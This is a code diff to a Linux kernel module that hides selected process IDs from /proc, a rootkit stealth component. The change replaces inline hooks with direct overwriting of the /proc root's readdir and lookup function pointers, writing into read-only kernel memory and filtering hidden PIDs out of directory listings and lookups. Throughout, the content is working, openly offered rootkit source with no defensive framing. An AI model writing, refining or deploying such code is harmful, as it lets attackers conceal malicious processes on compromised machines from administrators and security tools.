@@ -1,11 +1,21 @@
 #include "hide_proc.h"
-#include "inline_hook/p_lkrg_main.h"
+#include "inline_hook/utils/p_memory.h" // For remap_write_range
 #include <linux/kernel.h>
 #include <linux/version.h>
 #include <linux/proc_fs.h>
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/spinlock.h>
+#include <linux/namei.h> // For filp_open/filp_close
+
+// --- Original function pointers storage ---
+static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
+static struct dentry * (*original_proc_root_lookup)(struct inode *, struct dentry *, unsigned int);
+
+// --- Pointers to the VFS operation structs ---
+static struct file_operations *proc_root_fops;
+static struct inode_operations *proc_root_iops;
+
 
 // --- PID list management (copied from original) ---
 struct hidden_pid_entry {
@@ -80,14 +90,9 @@ void clear_hidden_pids(void) {
 }
 
 
-// --- New implementation using inline_hook engine ---
+// --- New implementation using VFS pointer swapping ---
 
 // --- Hook for readdir ---
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-
-// Forward declaration to solve circular dependency
-static struct p_hook_struct p_proc_root_readdir_hook;
 
 struct hooked_dir_context {
     struct dir_context original;
@@ -114,47 +119,29 @@ static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
 {
     struct hooked_dir_context hooked_ctx;
     int ret;
-	typedef int (*original_readdir_t)(struct file *, struct dir_context *);
-    original_readdir_t original_function = (original_readdir_t)p_proc_root_readdir_hook.stub->orig;
-
 
     if (!ctx || !ctx->actor) {
-        return original_function(file, ctx);
+        return original_proc_root_readdir(file, ctx);
     }
 
     hooked_ctx.original_ctx = ctx;
     memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
     *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;
 
-    ret = original_function(file, &hooked_ctx.original);
+    ret = original_proc_root_readdir(file, &hooked_ctx.original);
 
     ctx->pos = hooked_ctx.original.pos;
 
     return ret;
 }
 
-static char p_proc_root_readdir_hook_state = 0;
-static struct p_hook_struct p_proc_root_readdir_hook = {
-    .name = "proc_root_readdir",
-    .entry_fn = hooked_proc_root_readdir,
-};
-GENERATE_INSTALL_FUNC(proc_root_readdir)
-
-#endif
-
 // --- Hook for lookup ---
-
-// Forward declaration
-static struct p_hook_struct p_proc_root_lookup_hook;
 
 static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
 {
     char *endptr;
     long pid;
     const char *name;
-    struct dentry *ret;
-	typedef struct dentry * (*original_lookup_t)(struct inode *, struct dentry *, unsigned int);
-    original_lookup_t original_function = (original_lookup_t)p_proc_root_lookup_hook.stub->orig;
 
     if (dentry && dentry->d_name.name) {
         name = dentry->d_name.name;
@@ -164,34 +151,60 @@ static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry 
         }
     }
 
-    ret = original_function(dir, dentry, flags);
-    return ret;
+    return original_proc_root_lookup(dir, dentry, flags);
 }
-
-static char p_proc_root_lookup_hook_state = 0;
-static struct p_hook_struct p_proc_root_lookup_hook = {
-    .name = "proc_root_lookup",
-    .entry_fn = hooked_proc_root_lookup,
-};
-GENERATE_INSTALL_FUNC(proc_root_lookup)
 
 
 // --- Init and Exit functions ---
 
 int hide_proc_init(void) {
-    printk(KERN_INFO "[hide_proc] Initializing process hiding (via inline hook)\n");
+    struct file *proc_root_file;
+    struct inode *proc_root_inode;
+    void *new_readdir_ptr = &hooked_proc_root_readdir;
+    void *new_lookup_ptr = &hooked_proc_root_lookup;
 
+    printk(KERN_INFO "[hide_proc] Initializing process hiding (via VFS pointer swap)\n");
+
+    proc_root_file = filp_open("/proc", O_RDONLY, 0);
+    if (IS_ERR(proc_root_file)) {
+        printk(KERN_ERR "[hide_proc] Failed to open /proc\n");
+        return PTR_ERR(proc_root_file);
+    }
+
+    proc_root_inode = file_inode(proc_root_file);
+    proc_root_fops = (struct file_operations *)proc_root_inode->i_fop;
+    proc_root_iops = (struct inode_operations *)proc_root_inode->i_op;
+    filp_close(proc_root_file, NULL);
+
+    if (!proc_root_fops || !proc_root_iops) {
+        printk(KERN_ERR "[hide_proc] Failed to get /proc operations\n");
+        return -EFAULT;
+    }
+
+    // Hook readdir
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    if (p_install_proc_root_readdir_hook(0) != 0) {
+    original_proc_root_readdir = proc_root_fops->iterate_shared;
+    if (remap_write_range(&proc_root_fops->iterate_shared, &new_readdir_ptr, sizeof(void *), true)) {
+        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
+        return -EFAULT;
+    }
+#else
+    original_proc_root_readdir = proc_root_fops->readdir;
+     if (remap_write_range(&proc_root_fops->readdir, &new_readdir_ptr, sizeof(void *), true)) {
         printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
         return -EFAULT;
     }
 #endif
 
-    if (p_install_proc_root_lookup_hook(0) != 0) {
+    // Hook lookup
+    original_proc_root_lookup = proc_root_iops->lookup;
+    if (remap_write_range(&proc_root_iops->lookup, &new_lookup_ptr, sizeof(void *), true)) {
         printk(KERN_ERR "[hide_proc] Failed to hook proc_root_lookup.\n");
+        // Restore readdir hook on failure
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-        p_uninstall_proc_root_readdir_hook(); // Clean up previous hook
+        remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
+#else
+        remap_write_range(&proc_root_fops->readdir, &original_proc_root_readdir, sizeof(void *), true);
 #endif
         return -EFAULT;
     }
@@ -201,10 +214,20 @@ int hide_proc_init(void) {
 }
 
 void hide_proc_exit(void) {
-    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring hooks)\n");
+    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring VFS pointers)\n");
+
+    if (proc_root_fops && original_proc_root_readdir) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    p_uninstall_proc_root_readdir_hook();
+        remap_write_range(&proc_root_fops->iterate_shared, &original_proc_root_readdir, sizeof(void *), true);
+#else
+        remap_write_range(&proc_root_fops->readdir, &original_proc_root_readdir, sizeof(void *), true);
 #endif
-    p_uninstall_proc_root_lookup_hook();
+    }
+
+    if (proc_root_iops && original_proc_root_lookup) {
+        remap_write_range(&proc_root_iops->lookup, &original_proc_root_lookup, sizeof(void *), true);
+    }
+
     clear_hidden_pids();
+    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
 }
